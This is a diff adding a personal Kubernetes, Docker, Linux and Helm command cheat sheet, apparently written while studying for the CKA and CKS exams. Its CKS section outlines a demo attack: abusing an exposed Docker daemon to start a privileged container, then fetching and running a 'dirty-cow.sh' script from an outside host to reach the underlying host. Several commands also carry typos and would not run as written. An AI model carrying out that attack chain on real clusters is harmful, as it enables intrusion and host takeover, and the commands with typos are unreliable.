@@ -1,0 +1,927 @@
+-------alias-----
+alias k=kubectl 
+alias kaf="kubectl apply -f"
+alias kg="kubectl get"
+export do="-o yaml --dry-run=client"
+
+-----AUTHENTICATION____
+cat /etc/kubernetes/manifests/kube-apiserver.yaml #that wat you can see your all certificate
+openssl genrsa -out jane.key 2048 #create a userKey
+openssl req -new -key jane.key -out jane -subj "/CN=jane" #creating your cretificate
+openssl genrsa -out mustafa.key 2048 # creating your userKey
+openssl req -new -key mustafa.key -out mustafa.csr -subj "/CN=username@mustafa.net/O=DevOps" #creating your cretificate 
+kubectl get csr #check all certificate signing request
+kubectl certificate approve <username> #approve user certificate 
+kubectl get csr <username> -o yaml #view the certificate
+       AUTH CAN-I
+#what if you have been a user would like to see if have
+access to a particular resources in the cluster.
+kubectl auth can-i create deployments #You can use auth can-i command then and you can create deployment
+kubectl auth can-i delete nodes# or delete command,you can delete node
+kubectl auth can-i create deployments --as dev-user
+kubectl auth can-i create pods --as dev-user
+kubectl auth can-i create pods --as dev-user --namespace test #specify the namespace The dev-user does not have permission to create a pod in the test namespace.
+
+--------api-resources-----
+kubectl api-resources # that show short term of the resources
+kubectl api-resources --namespaced=true
+kubectl api-resources --namespaced=false
+kube-apiserver -h | grep enable-admission-plugins # you'll see a list of admission controllers that are enabled by default
+grep enable-admission-plugins /etc/kubernetes/manifests/kube-apiserver.yaml
+ps -ef | grep kube-apiserver | grep admission-plugins
+
+----installing-kubeadm----
+apt-get upgrade -y kubeadm=1.12.0-00
+kubeadm upgrade plan
+kubeadm upgrade apply
+kubeadm upgrade node config --kubelet-version v1.12.0
+systemctl restart kubelet
+kubectl drain node-1 # if node is down and not coming back kubernetes will kill that pods and recreate in the an other node  our pods
+means node is not scheduled that you can run your pod in that pod
+the node is also cordoned or marked as unschedulable.
+kubectl cordon node-2# means make marks an existed  node unschedulable
+kubectl uncordon node-1#means we can make unmarked you can schedule
+if node is down and not coming back kubernetes will kill that pods and recreate in the an other node  our pods
+kubectl drain node01 --ignore-daemonsets
+cat /etc/kubernetes/manifests/kube-apiserver.yaml #that wat you can see your all certificate
+
+----Monitoring-Cluster-Using-kubectl----
+kubectl get pods
+kubectl get all -A
+kubectl describe pod pod_name
+kubectl get events -A
+kubectl top node
+kubectl top pods
+kubectl logs pod_name -c container_name
+
+----serviceaccount----(uses for machine like Jenkins or Prometheus)
+kubectl create serviceaccount dashboard-sa
+kubectl get serviceaccount
+kubectl describe serviceaccount dashboard-sa
+kubectl describe secret dashboard-sa-token-kbbdm#inspect your secret token
+kubeectl exec -it my-kubernetes-dashboard ls /var/run/secrets/kubernetes.io/serviceaccount
+serviceaccountPath=/var/run/secrets/kubernetes.io/serviceaccount
+
+serviceAccount-ImagePullSecret 
+"kubectl create secret docker-registry myregistrykey 
+--docker-username=pullai2hew --docker-password=3a131780-67a1-405a-a153-edb768c14467 
+--namespace prime"
+
+kubectl create namespace dev
+kubectl create deployment <deployment name> —image=<image name> —namespace=<namespace name> —replicas=<number of the replicas>
+kubectl create -f replicaset-definition.yaml
+kubectl create -f pod-defination.yaml --namespace=dev
+kubectl create configmap webapp-config-map —from-literal=APP_COLOR=darkblue
+kubectl create secret generic app-secret --from-literal=DB_Host=mysql #for default usuername and Password
+kubectl create secret generic app-secret --from-literal=DB_Host=mysql --from-literal=DE_User=root --from-literal=DB_Passwoed=passwd
+kubectl create ingress <ingress-name> --rule="host/path=service:port"
+kubectl create configmap nginx-configuration --namespace ingress-space
+
+kubectl create deploment fluentd-elasticsearch --image quay.io/fluentd_elasticsearch/fluentd:v2.5.2 -o yaml --dry-run=client > daemonset.yaml
+"after create yaml file in the vi editor change kind deployment to deamonset"
+
+-------CONFIG-----
+kubectl config view #checks in the config file
+kubectl config view --kubeconfig=my-custom-config
+kubectl config use-context prod-user@production#update current context 
+kubectl config --kubeconfig=my-kube-config use-context research
+--------
+kubectl cluster set-context --context --namespace=<namespace> #changing current nameespace
+--------
+kubectl delete job <pod name>
+kubectl delete replicaset my app-replicase
+--------
+kubectl describe secret dashboard-sa-token-kbbm
+kubectl describe node kubemaster | grep Taint #shows taint of master node
+
+kubectl describe networkpolicy
+
+kubectl describe pod kube-apiserver-controlplane -n kube-system
+kubectl describe rolebinding kube-proxy -n kube-system
+kubectl describe daemonset kube-proxy --namespace=kube-system
+kubectl describe configmap
+kubectl describe clusterrolebinding cluster-admin
+kubectl describe pvc myclaim # inspecting persisten volume claim
+
+--------EXEC------
+kubectl exec app -it -n elastic-stack -- cat /log/app.log #to see logs of the container
+kubectl exec ubuntu-sleeper -- whoami # that command shows that pod user ex=root
+kubectl exec it <pod name> -- bin/sh #you can get in the container while it works
+kubectl exec kube-apiserver-controlplane -n kube-system -- kube-apiserver -h | grep enable-admission-plugins
+#if you're runnig this in a kubeadm based setup, the you must run this command within the kube-apiserver-controlplane 
+#pod/
+kubectl exec busybox ip route
+
+--------EXPOSE-----
+kubectl expose pod redis —name redis-service —port=6379
+kubectl expose pod  messaging-cb54c5d4f-pspqj --type=ClusterIP --name=messaging-service --port=6379
+kubectl expose deployment simple-webapp-deployment --name=webapp-service
+--target-port=8080 --type-NodePort=30080 --port=8080 --dry-run=client -o yaml > svc.pod
+--------
+kubectl -n kube-system get pods | grep proxy
+kubectl -n ingress-space expose deployment ingress-controller --name=ingress --port=80
+--target-port=80 --type=NodePort --dry-run=client -o yaml > ingress-svc.yaml
+--------
+kubectl explain pods --recursive | less then you search in  t with / what you need
+kube-controller-manager --pod-eviction-timeout=5m0s
+--------
+kubectl edit deployment <deployment name> # that helps to edit your deploment
+kubectl edit role developer -n blue
+--------
+kubectl get deployment --namespace app-space
+kubectl get pod <pod-name> -o yaml > pod-definition.yaml == this command is creating YAML file include what you need
+kubectl get pods -n kube-etcd #calls pod with namespaces
+kubectl get pods --as dev-user
+kubectl get pods --namespace=<pods name>
+kubectl get replicaset
+kubectl get services
+kubectl get jobs
+kubectl get cronjobs
+kubectl get pods --show-labels
+kubectl label pod pod9 app- #deleting existed labels
+kubectl label --overwrite pod pod9 team=team3 #updates your existed labels
+kubectl label pods --all foo=bar #adding labels all pods
+kubectl annotate pods annotationpod foo=bar #adding annotation for pods
+kubectl annotate pods annotationpod foo- #deleting annotation on the pod
+
+kubectl get nodes node01 --show-labels
+kubectl get nodes/pods | grep -i
+kubectl get pods --selector app=App1 #that is called pods with labels
+kubectl get all --selector env=prod #this is called labels all resources
+kubectl get pods --all-namespaces
+kubectl get all #shows deployment replicaset and pods ones a time
+kubectl get all --all-namespaces -o yaml > all-deploy-services.yaml
+kubectl get label env=dev --no-headers | wc -l #thats show your labels of numbers
+
+----PersistentVolume&persistenVolumeClaim----
+kubectl get persistentvolume
+kubectl exec -it task-pv-pod -- /bin/bash #Get a shell to the container running in your Pod
+
+------
+kubectl get pods -l env=prod,bu=finance,tier,frontend # brings pods with all labels
+kubectl get networkpolicy
+kubectl get persistentvolumeclaim/pvc
+kubectl get storageclasses/sc
+kubectl get roles
+kubectl get rolebindings
+kubectl get deamonsets
+kubectl describe
+kubectl get daemonset --all-namespaces
+
+-------
+kubectl logs -f event-simulator-pod     #you can view logs using that to control logs command with pod name
+kubectl logs -f event-simulator-pod event-simulator     #that command you specified the container logs
+kubectl logs math-add-job-1d87pn #shows result of batch pod
+kubectl logs etcd-master 
+kubectl logs web -f --previous
+kubectl logs weave-net-5gcmd weave -n kube-system
+-------
+kubectl proxy # get in the cluster 
+
+---RBAC----
+kubectl create role developer --namespace=default --verb=list,create,delete --resource=pods
+kubectl create rolebinding dev-user-binding --namespace=default --role=developer --user=dev-user
+kubectl get clusterroles --no-headers | wc -l
+kubectl get clusterrolebindings --no-headers | wc -l
+kubectl get roles --all-namespaces --no-headers | wc -l #calls all roles with namespaces of numbers
+kubectl get roles -A #calls all roles
+kubectl describe role <roleName>
+kubectl describe role <name of role>
+kubectl describe rolebinding <name of rolebinding>
+----------
+
+watch "kubectl get pods" #shows live time for creation of pod
+kubectl -n kube-system get pods # checks system that created wit that pod
+kubectl run httpd —-image=httpd:alpine —-port=80 —-expose #creates a pod and service then expose port 80
+kubectl run redis —-image=redis:alpine —-labels=tier=db
+kubectl run nginx --image=nginx --restart=Never --dry-run=client -replicas=3 -o yaml > definition.yaml
+kubectl run firstpod --image=nginx --port=80 --labels="app=frontend,team=developer" --restart=Never
+kubectl replace -f replicaset-definition.yaml
+kubectl replace -f simple-webapp-2.yaml --force #delete pod and replace another one whic is same name pod
+kubectl rollout status deployment/myapp-deployment
+kubectl rollout history deployment/myapp-deployment
+kubectl rollout history deployment nginx --revision=1
+kubectl rollout undo deployment/myapp-deployment #that brings your previous version of containers
+kubectl rollout history deploy rolldeployment --revision=2 #checks history of rolling update 
+kubectl rollout status deploy rolldeployment -w #you can watch your deployment rollinf update like live
+kubectl rollout pause deploy rolldeployment #you can stop your rollingUpdate if there are some proplem on your application
+kubectl rollout resume deploy rolldeployment #you can resume your stopped rollingUpdate 
+---backup ETCD--
+
+kubectl describe pod etcd-controlplane -n kube-system #image version is etcd version
+kubectl -n kube-system logs etcd-controlplane | grep -i 'etcd Version'
+
+kubectl describe pod etcd controlplane -n kube-system | grep -i '\--listen-client-urls' #to see localHost and port
+
+kubectl -n kube-system describe pod etcd-controlplane | grep '\--cert-file' #to see server certificate file 
+
+ETCDCTL_API=3 etcdctl --endpoints 127.0.0.1:2379 \ 
+  --cert=/etc/kubernetes/pki/etcd/server.crt \
+  --key=/etc/kubernetes/pki/etcd/server.key \
+  --cacert=/etc/kubernetes/pki/etcd/ca.crt \ snapshot save /opt/snapshot.db #to take backup you cluster
+
+ETCDCTL_API=3 etcdctl --endpoints 127.0.0.1:2379 \ 
+  --cert=/etc/kubernetes/pki/etcd/server.crt \
+  --key=/etc/kubernetes/pki/etcd/server.key \
+  --cacert=/etc/kubernetes/pki/etcd/ca.crt \ snapshot status /opt/snapshot.db -w table #to check your backup status
+
+ETCDCTL_API=3 etcdctl --data-dir <data-dir-location> snapshot restore snapshotdb #to up and run your cluster
+
+after check your deployment, pods, services etc. for sure everything is healthy
+
+Reference URL: https://kubernetes.io/docs/tasks/administer-cluster/configure-upgrade-etcd/
+
+
+
+
+
+      ---------
+
+kubectl set image deployment/myapp-deployment \ nginx=nginx:1.9.1 #updating your image with Imperative mode
+kubectl scale -replicas=6 -f replicaset-def.yaml
+kubectl scale statefulset mysql --replicas=5
+k scale sts o3db -n project-c13 --replicas 1 3scale statefulset
+kubectl taint nodes node-name key=value:taint-effect
+kubectl taint nodes node1 app=blue:NoSchedule
+kubectl taint node controlplane node-role.kubernetes.io/master:NoSchedule-#untaint your node with "-" end of the command
+kubectl top node/pod  #shows your nodes or pods CPU and MEM
+kubectl version --short
+
+-----INGRESS----
+kubectl get deployments --all-namespaces
+kubectl get ingress --all-namespaces
+kubectl describe ingress <ingerresName> -n <nameSpace>
+kubectl get ingress <ingressName> -n <nameSpace> -o yaml > definationFile.yaml
+kubectl delete ingress <ingressName> -n <nameSpace>
+kubectl apply -f definationFile.yaml
+kubectl get deployments,svc -n <nameSpace>
+kubectl create namespace app-space
+kubectl config set-context --current --namespace development #changes your namespace on the current context
+kubectl crete serviceaccount ingress-serviceaccount
+kubectl -n ingress-space expose deployment ingress-controller --name ingress --port 80 --target-port 80 --type NodePort --dry-run=clinet -o yaml > ingress-svc.yaml
+
+
+-----DOCKER-----
+docker biuld # create an image
+docker run --network none nginx # 
+dokcer network ls #Lists all the networks the Engine `daemon` knows about.
+docker build -t webapp-color:lite . #creates image less size.
+docker images #shows your images what you have
+docker ps #checks your containers
+docker ps -o wide #checks your containers with more info
+docker run ubuntu #up and runnig your container with ubuntu image
+docker run python:3.6 cat /etc/*release* #inspect your image
+docker run -p 8383:8080 webapp-color:lite #run your container that gives specific ports
+docker run -e APP_COLOR=pink simple-webapp-color #create container with environment
+docker run private-registry.io/apps/internal-app
+docker run --cap-add MAC_ADMIN ubuntu #add privileges 
+docker run --cap-drop KILL #drop privileges
+docker run --user=1000 ubuntu sleep 3600#run containers with user id
+docker logs -f ecf
+docker login private-registry.io
+kubectl exec ubuntu-sleeper -- whoami # shows the user of the container
+ps aux #list of processes with users
+docker run python:3.6 cat /etc/*release* #show what OS using for python 
+docker image prune -a #delete all images ones a time
+docker container prune #delete all stopped container ones a time
+
+echo -n 'bx1zcWw=' | base64 # that is making encryipted your DB-name-user-password
+echo -n 'bx1zcWw=' | base64 --decode # that is making decryipted your DB-name-user-pass
+curl https://kube-master:6443/version #checks master node version
+curl https://kube-master:6443/api/v1/pods #checks pods 
+curl https://my-kube-playgroud:6443/api/v1/pods #to connect and validate yourself by API server
+curl http://localhost:6443 -k # checks api groups
+curl http://localhost:6443/apis -k | grep "name" # checks names of the apis 
+curl http://web-service-ip:node-ports
+cat /etc/*release* #chekcs your software
+/usr/include/linux/capability.h
+
+"in the vi editor you can delete multiple line ones a time with this command
+d<number>d = you add number of the delete of lines"
+
+------NETWORKING-----
+ip link #IP link is to list and modify interfaces on the host
+ip a | grep -B2 10.47.66.3
+cat /etc/network/interfaces #shows interfaces card
+
+ifconfig eth0 # shows ip adress 
+ssh node01 ifconfig eth0
+
+netstat -natulp | grep kube-scheduler # grep listens of the port
+netstat -natulp | grep etcd-controlplane
+
+kubectl apply -f "https://cloud.weave.works/k8s/net?k8s-version=$(kubectl version | base64 | tr -d '\n')&&env=IPALLOC_RANGE=10.50.0.0/16"
+here is setting CNI plugins that name "weave" with ip range 10.50.0.0/16
+
+cat /etc/kubernetes/manifests/kube-apiserver.yaml | grep cluster-ip-range
+ #IP Range configured for the services within the cluster
+
+Some basics for Quick Checks
+
+ip link
+ip link | grep ens3
+ip link show ens3
+arp node
+ip route show default
+netstat -nplt
+netstat -anp | grep etcd
+
+ps -aux | grep kubelet
+ps -aux | grep kube-api
+ls /etc/cni/net.d/
+
+kubectl logs weave -n kube-system
+kubectl logs -n kube-system
+
+kubectl run test --restart=Never --image=busybox:1.28 --rm -it – nslookup nginx-resolver-service
+
+cat /etc/cni/net.d/ #shows CNI that your cluster has 
+ip addr show <interfaceNAme>
+ip addr add 192.168.1.10/24 dev eth0
+ping 192.168.1.11
+ip route
+ip r
+route #It displays the kernels routing table
+ip route add 192.168.2.0/24 via 192.168.1.1 #specify that you can reach the ip address
+ip route add default via 192.168.1.1#connting swich to  internet
+on the command if yu add internet ip that means you can access only that ip range 
+that is why best practise to add default.
+cat /proc/sys/net/ipv4/ip_forward
+echo 1 /proc/sys/net/ipv4/ip_forward
+If you want to persist these changes you must set them in the /etc/network/interfaces file.
+ip -n red addr add 192.168.1.10/24 dev veth-red # While testing the Network Namespaces
+arp #ARP Command is a TCP/IP utility used for viewing and modifying the local Address Resolution Protocol (ARP) cache.
+netstat -plnt #Netstat prints information about the Linux networking subsystem
+DNS
+cat >> /etc/host#gives name of the ip address
+nslookup www.google.com 
+dig www.google.com
+
+kubectl run nginx --image nginx --command sleep 1000
+kubectl exec -it nginx -- bash OR sh # ssh to pod
+and run: ip route 
+then see your default gateway ip for worker node
+
+
+
+---
+ip link add v-net-0 type bridge
+ip link set dev v-ne-0 up
+ip addr add 192.168.15.5/24 dev v-net-0
+ip link add veth-red type veth peer name eth-red-bridge
+ip link set veth-red netns red
+ip -n red addr add 192.168.15.1 dev veth-red
+ip -n red link set veth-red up
+ip link set veth-red-br master v-net-0
+ip netns exec blue ip route add 192.168.1.0/24 via 192.168.15.5
+iptables -t nat -A POSTROUTIN -s 192.168.15.0/24 -j MASQUERADE
+ps -aux | grep kubelet | grep cni # multiple greping
+---
+kubectl get pods -n kube-system#you can see your DNS pods
+cat /etc/cni/net.d/10-flannel.conflist #to see binary executable file
+
+
+
+TROUBLESHOOTING
+
+-----When Pods Malfunction----
+#Pod logs
+kubectl logs pod_name -c container_name 
+#Crashed Pod Logs
+kubectl logs --previous pod_name -c container_name #checks pod logs while crashing pod
+???Note:You can also run commands inside of a running Pod.
+#Execute command in a pod
+kubectl exec pod_name -c container_name -- command arg
+#Open shell in a pod
+kubectl exec pod_name -c container_name -- sh or replace sh with /bin/sh, etc if needed
+
+
+----ApplicationsFailures---
+curl http://web-service-ip:node-port #check if the web server is accessible on the IP of the node-port using curl
+/root/curl-test.sh
+kubectl describe service web-service
+kubectl get pods
+kubectl describe pod nginx-pod
+kubectl logs nginx-pod 
+kubectl logs nginx-pod -f
+kubectl logs nginx-pod -f --previous
+kubectl logs nginx-pod -c nginx-container # checks logs of container
+
+kubectl -n gamma describe svc mysql-service | grep -i selector
+kubectl -n gamma describe pod mysql | grep -i label
+kubectl -n epsilon describe pod mysql  | grep MYSQL_ROOT_PASSWORD 
+
+if problem on the controlplane(master node) 
+kubectl get all
+kubectl get nodes
+kubectl get pods
+kubectl get pods -n kube-system
+kubectl scale deployment <deplolmentName> --replicas=2
+docker ps -a | grep kube-apiserver # also you can check you container logs 
+docker container logs 8af74bd23540  --tail=2# # to see problem in the container 
+
+kubectl logs -n kube-system kube-controller-manager-master
+#if the contolplane compnents are deployed as services as in your case
+then check the stataus of the services on the master node
+   service kube-apiserver status
+   service kube-controller-manager status
+   service kube-scheduler status
+or worker node
+service kubelet status
+service kube-proxy status
+
+#check the logs of the controlplane components.
+   kubectl logs kube-apiserver-master -n kube-system
+   kubectl logs -n kube-system kube-controller-manager-controlplane
+in this case of kubeadm use the that command to view the
+logs of pods hosting the controlplane components.
+In case of services configured natively on the master nodes, 
+view the service logs using the hosts logging solution.
+in your case we could use the journalctl utility to view the 
+kube-apiserver log.
+sudo journalctl -u kube-apiserver
+
+
+------workerNode-TROUBLESHOOTING
+ssh root@nodeName
+   kubectl get nodes
+   kubectl describe node worker-node-1
+Note:Check the LastHeartbeatTime field to find out the time when the node might have 
+crashed 
+
+   
+   #in the worker node
+   top #check for possible CPU
+   df -h #check for disc space on the node
+   service kubelet status# check status of kubelet
+   sudo journalctl-u kubelet #check kubelet logs for possible issues
+   openssl x509 -in /var/lib/kubelet/worker-node-1.crt -text #check certificates, ensure they are not
+expired and the are part of the right group and that certificateare issued bt the right CA.
+   journalctl -u kubelet
+   journalctl -u kubelet -f
+
+kubectl get nodes
+systemctl status kubelet
+systemctl start kubelet
+systemctl enable kubelet
+systemctl status docker
+
+kubectl drain node02 # to make unschedulable node02 but that time pods will still alive in the another nodes
+
+
+
+_____JSONPATH______
+
+in the command "dictionary{}" starts with ".(dot)"
+in the command  if there is a "list[]" you have to specify number of the list end of the word 
+Ex: Labels[2].app for more clear check the below
+Labels:
+  app:
+  tier:
+  name:
+
+Get all numbers greater than 40
+$[ Check if each item in the array > 40 ]
+          Check if => ? ()
+$[?( each item in the list > 40)]
+   each item in the list => @
+$[?(@>40)] # check if eache item in the array greater than 40
+@ == 40 #equals 40    @ in [40,43,45]
+@ != 40 #not equals 40    @ nin [40,43,45]
+
+$.car.wheels[2].model # get yhe model of the rear-right wheel
+if you do not know right locations in the list you can search with belong of the this setences
+$.car.wheels[?(@.location == "rear-right")].model #checks locations of item
+$.status.containerStatuses[?(@.name == 'redis-container')].restartCount
+
+----Wildcard-----
+$.car.color # gets cars color
+$.bus.color #gets bus color
+$.*.color # gets all color in the dictionary
+
+$[0].model #gets first cars model in the list
+$[*].model #gets all cars model in the list
+
+$.car.wheels[0].model # gets cars model
+$.car.wheels[*].model # gets all models of cars
+$.bus.wheels[*].model # gets all models of bus
+$.*.wheels[*].model # gets car and bus models together
+$.prize[?(@.year == 2014)].leatures[*].firstname
+$.status.containerStatuses[?(@.name == "redis-container")].restartCount
+
+-----in-kubernetes-JSONPATh-----
+kubectl get pods -o=jsonpath='{.items[0].spec.containers[0].image}'# brings your containers images
+kubectl get nodes -o=jsonpath="{.itams[*].metadata.name}" # brings nodes of list
+kubectl get nodes -o=jsonpath="{.itams[*].status.nodeInfo.architecture}' # brings nodes info
+kubectl get nodes -o=jsonpath="{.itams[*].status.capacity.cpu}' # brings memory of pods
+
+kubectl get nodes -o=jsonpath='{.items[*].metadata.name}{.items[*].status.capacity.cpu}' 2 in 1 command that brings nodes list and memory
+
+kubectl get nodes -o=jsonpath='{.items[*].metadata.name} {"\n"} {.tems[*].status.capacity.cpu}' #{"\n"}list with NewLine
+kubectl get nodes -o=jsonpath='{.items[*].metadata.name} {"\t"} {.tems[*].status.capacity.cpu}' # {"\t"} list with Tab 
+
+kubectl get nodes -o=jsonpath='{range .items[*]}{.metadata.name} {"\t"} {.status.capacity.cpu} {"\n"} {end}'
+
+kubectl get nodes -o=custom-columns=<COLUMN NAME>:<JSON PATH>
+kubectl get nodes -o=custom-columns=NODE:.metadata.name # brings nodes list
+kubectl get nodes -o=custom-columns=NODE:.metadata.name ,CPU:.statuscapacity.cpu
+
+kubectl get nodes --sort-by= .metadata.name
+kubectl get nodes --sort-by= .stataus.capacity.cpu
+
+kubectl -n admin2406 get deployment 
+-o custom-columns='DEPLOYMENT:.metadata.name
+,CONTAINER_IMAGE:.spec.template.spec.containers[].image
+,READY_REPLICAS:.status.readyReplicas
+,NAMESPACE:.metadata.namespace' --sort-by=.metadata.name
+# converting columns to sort
+
+--------
+FOR EACH NODE
+  PRINT NODE NAME \t PRINT CPUS COUNT \n
+END FOR
+
+'{range .items[*]}
+   {.metadata.name} {"\t"} {.status.capacity.cpu} {"\n"}
+{end}'
+--------
+
+kubectl run nginx --image nginx:alpine -l tier=msg
+kubectl get pods --show-labels
+kubectl expose pod nginx --name nginx-service --port 8080 --target-port 8080 (--type ClusterIP)
+kubectl create deployment he-web-app --image kodekloud/webapp-color
+kubectl scale deployment hr-web-app --replicas=2
+
+kubectl run static-busybox --image busybox --command sleep 1000 -dry-run=client -o yaml > static-busybox.yaml
+ls -l /etc/kubernetes/manifests
+grep -i staticPod /var/lib/kubelet/conf.yaml   # shows static pod path
+
+kubectl expose deployment hr-web-app --name hr-web-app-service --port 8080 --target-port 8080 --type-NodePort=30082 -o yaml > svc.yaml
+
+
+-------
+
+kubectl run nginx-resolver --image nginx
+
+kubectl expose pod nginx-resolver --name=nginx-resolver-service --port=80 --target-port=80 --type=ClusterIP
+
+kubectl run test-nslookup --image busybox:1.28 --rm -it -- nslookup nginx-resolver-service > /root/nginx.svc
+cat /root/nginx.svc
+
+kubectl get pods -o wide #check pod ip
+kubectl run test-nslookup --image=busybox:1.28 --rm -it -- nslookup 10-32-0-5.default.pod > /root/nginx.pod
+cat /root/nginx.pod
+
+
+
+14  k get pods
+   15  kubectl get pods
+   16  kubectl get pod test-nslookup -o yaml > pod.yaml
+   17  kubectl delete pod test-nslookup
+   18  vi pod.yaml 
+   19  kubectl apply -f pod.yaml 
+   20  kubectl get pods
+   21  kubectl exec -i -t test-nslookup -- nslookup nginx-resolver-service > /root/CKA/nginx.svc
+   22  cat /root/CKA/nginx.svc
+   23  kubectl get pods -o wide
+   24  kubectl exec -i -t test-nslookup -- nslookup 10-50-192-1.default.pod > /root/CKA/nginx.svc
+   26  kubectl exec -i -t test-nslookup -- nslookup nginx-resolver-service > /root/CKA/nginx.pod
+   27  cat /root/CKA/nginx.svc
+   28  cat /root/CKA/nginx.pod
+
+kubectl create serviceaccount pvviewer
+kubectl create clusterrole pvviewer-role --verb=list --resource=persistentvolume
+kubectl create clusterrolebinding pvviewer-role-binding --clusterrole=pvviewer-role --serviceaccount=default:pvviewer
+crete yaml file including serviaccount name
+
+kubectl get nodes -o=jsonpath="{.items[*].status.addresses[0].address}"
+
+kubectl cluster-info --kubeconfig=/root/super.kubeconfig
+to see information or error in custom kubeconfig
+
+scp webtool.yaml root@node01:/etc/kubernetes/manifests/
+
+kubectl exec webapp -it -- sh
+# nc -z -n -v -w 1 secure-service 80
+check service connection
+
+
+root@controlplane:~# kubectl exec webapp-color -it -- sh
+/opt # nc --spider --timeout=1 secure-service 80
+nc: unrecognized option: spider
+BusyBox v1.28.4 (2018-07-17 15:21:40 UTC) multi-call binary.
+
+Usage: nc [OPTIONS] HOST PORT  - connect
+nc [OPTIONS] -l -p PORT [HOST] [PORT]  - listen
+
+        -e PROG Run PROG after connect (must be last)
+        -l      Listen mode, for inbound connects
+        -lk     With -e, provides persistent server
+        -p PORT Local port
+        -s ADDR Local address
+        -w SEC  Timeout for connects and final net reads
+        -i SEC  Delay interval for lines sent
+        -n      Don't do DNS resolution
+        -u      UDP mode
+        -v      Verbose
+        -o FILE Hex dump traffic
+        -z      Zero-I/O mode (scanning)
+/opt # 
+
+
+-----HELM(PACKAGE-MANAGER-FOR-KUBERNETES)-----
+
+helm install wordpress
+helm updrade wordpress
+helm rollback wordpress #bring back the previous verson
+helm uninstall wordpress #when you do helm uninstall all resources remove ones a time
+
+---installing-HELM----
+###for-linux
+curl -fsSL -o get_helm.sh https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3
+chmod 700 get_helm.sh
+./get_helm.sh
+
+-----
+helm search hub chart-name #command to search specific charts on Artifact Hub
+helm repo add bitnami https://charts.bitnami.com/bitnami
+helm search repo joomla
+helm repo list
+helm install bravo bitnami/drupal
+helm install [release-name][chart-name]
+helm install my-site bitnami/wordpress
+helm list
+helm uninstall my-release
+helm pull --untar bitnami/wordpress
+ls wordpress
+helm install release-4 ./wordpress
+
+
+
+-----CKS---
+1-Attack(someone who is trying to attack your app)
+   ping www.vote.com
+   ping www.result.com
+   zsh port-scan.sh 104.21.63.124 #scaning all port to access in the cluster
+   docker -H www.vote.com ps #list all the contianer of Application
+   docker -H www.vote.com version #to see version of the Docker engine runnning on the host
+   docker -H www.vote.com run --privileged -it ubuntu bash #to get privilige container 
+   curl http://catgirl.me/dirty-cow.sh > dirty-cow.sh (not found in the system) #trying to own script which for hack to app
+   wget (not found in the system) 
+   apt-get install curl
+   apt-get update #ones updated the privilige container  
+   apt-get install curl #it able to install curl to run your own script
+   curl http://catgirl.me/dirty-cow.sh > dirty-cow.sh #download the scriptand run it to escape 
+   sh dirty-cow.sh #after that you have terminal to underlying host
+   sudo docker ps
+   df -h
+   uname # check OS name
+   hostname
+   sudo iptables -L -t nat | grep kubernetes-dashboard #to see nodePort number 
+   sudo docker ps | grep db
+   docker exec -it c0cd bash
+2-The 4C’s of Cloud Native security
+   4C=Cloud,Cluster,Container,Code
+3-Cluster Setup and Hardening
+   ---CIS-Benchmarks---(CIS; Certer for Internet Security)
+   ---AUTHENTICATION----
+   1- curl -v -k https://localhost:6443/api/v1/pods -u
+   ---ServiceAccount---
+   1- service account is for machine 
+   2- service acount could be an account used by an a (Prometheus)
+   3- kubectl create serviceaccount dashboard-sa (token will created automatically)
+   4- kubectl get serviceaccount 
+   5- kubectl describe serviceaccount dashboard-sa
+   6- every namespace has own serviceaccount
+   7- every pod automatically mounted service account if sa is default
+   8- serviceaccount path /var/run/secrets/kubernetes.io/serviceaccount
+   9- kubectl exec -it my-kubernetes-dashboard ls /var/run/secrets/kubernetes.io/serviceaccount
+   10- kubectl exec -it my-kubernetes-dashboard cat /var/run/secrets/kubernetes.io/serviceaccount/token
+   ---SSL-TLS-CERTIFICATION---
+   1- openssl genrsa -out ca.key 2048 #generate keys
+   2- openssl req -new -key ca.key -subj "/CN=KUBERNETES-CA" -out ca.csr #certificate signing request
+   3- openssl x509 -req -in ca.csr -signkey ca.key -out ca.crt # sing certificate
+
+
+****Linux Commands******
+uname -a #Check linux kernel
+
+whoami # checks who are you
+pwd # checks present directory
+ls # list files and directory on current location
+ls -lrt # list more informal everyting on current
+      Find File (find-locate)
+find . -name "permissiontext" # finding permissiontext file on the current
+find / -name "permissiontext" # finding permissiontextfile on the root home
+sudo updatedb # before you run locate command you need to run it as a root  
+locate "permissiontext" # fin file and locate is faster then find
+   # before you run locate command you should run updatedb as a root user after that you can run locate command
+chmod rwx permissiontext # giving permission to file
+chown root permissiontext # change owner
+chgrp root permissiontext # change group
+      Access Conrtrol List (ACL) (getfacl-setfacl)
+getfacl /tmp/permissiontext # get information about file of owner gruop and permission
+setfacl -m u:user:rwx /tmp/permissiontext # to add permission for user
+setfacl -m g:group:rw /tmp/permissiontext # to add permission for group
+setfacl -dm "entry" /tmp/permissiontext # to allow all files or directories to inherit ACL entries from the directory it is within
+setfacl -x u:user /tmp/permissiontext # to remove a user for permissiontext file
+setfacl -b /tmp/permissiontext # remove all entries for all users
+      Help Commands (whatis/--help/man)
+whatis ls # explains ls command
+ls --help #it tells you all the different options using with ls
+man ls #shows more details, description and more options for ls command
+      Adding Text to Files
+echo "only authorized person can add text" > permissiontext #adding text in yo the permissiontext file using echo
+ls -ltr > permissiontext # adding text in to permissiontext file usin bigger sing ">"
+vi permissiontext #using vi editor you can add your text
+vi permissiontext :set backup #while editing your file you get backup your file
+      Error stderr - 2
+ls -l /root 2> errorfile # that show your error. when you creting shell script this is use case 
+      Standart Output to a File Command "tee"
+echo "tee command has multiple feature" | tee permissiontext #using tee, it shows your text on the screen and save it onto new file
+echo "tee command has multiple feature" | tee -a permissiontext #same command using with -a that add text nexto the last line
+wc -c permissiontext # that shows how many character in the file
+      Pipe "|"
+ls -ltr | more # combine two command like one. more shows your result in the single page
+ls -ltr | tail -l # tail show last line in the command
+      File Display Commands (cat-more-less-head-tail)
+cat permissiontext #display what permissiontext file has inside
+more permissiontext #display what permissiontext file has one a page inside.Also you can go next page using space
+less permissiontext #display what permissiontext file has one a page inside.Also you can go next page using space and you can use J or K buttoms for scroll up or down
+head -2 permissiontext #display first two lines in the file
+tail -2 permissiontext #display last two lines in the file
+      Filter / Text Processors Commands (cut-aws-grep and egrep-sort-uniq-wc)
+cut -c1 permissiontext #gives you first character for all lines
+cut -c1,2,3 permissiontext #gives you first three characters for all lines
+cut -c1-5 permissiontext #you can also give a range. this example listing characters of 1 trough 5 all lines
+cut -c1-3,5-8 permissiontext
+cut -b1-3 permissiontext
+ls -l | cut -c1
+-
+awk '{print $1}' permissiontext #lists fist columns or field for all lines
